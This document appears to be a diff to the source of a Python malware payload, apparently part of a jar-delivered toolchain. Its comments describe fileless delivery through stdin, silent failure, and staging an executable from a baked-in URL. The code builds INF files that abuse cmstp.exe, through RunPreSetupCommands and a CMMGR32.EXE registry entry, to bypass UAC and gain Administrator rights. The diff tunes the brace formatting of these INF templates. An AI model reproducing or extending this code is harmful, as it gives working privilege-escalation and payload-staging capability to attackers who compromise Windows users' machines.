@@ -1,4 +1,4 @@
- # tung python-road payload — silent on every failure, stdlib only.
+# tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe ->Administrator lift via cmstp (majanito shape)
@@ -232,13 +232,13 @@ def build_inf(cmd, svc_name, addreg=None):
     addreg_txt = ""
     if addreg is None:
         s2 = f"C{rand_str(4)}"
-        cmd_block = (f"RunPreSetupCommands={{{s2}}}\n"
+        cmd_block = (f"RunPreSetupCommands={s2}\n"
                      f"[{s2}]\n"
                      f"{cmd}\n"
                      "taskkill /IM cmstp.exe /F\n")
     else:
         s4 = f"R{rand_str(4)}"
-        addreg_txt = (f"AddReg={{{s4}}}\n"
+        addreg_txt = (f"AddReg={s4}\n"
                       f"[{s4}]\n"
                       + "\n".join(addreg) + "\n")
     return f"""; {rand_str(16)}
@@ -246,9 +246,9 @@ def build_inf(cmd, svc_name, addreg=None):
 Signature=$chicago$
 AdvancedINF=2.5
 [DefaultInstall]
-CustomDestination={{{s1}}}
+CustomDestination={s1}
 {cmd_block}{addreg_txt}[{s1}]
-49000,49001={{{s3}}}, 7
+49000,49001={s3}, 7
 [{s3}]
 "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 [Strings]
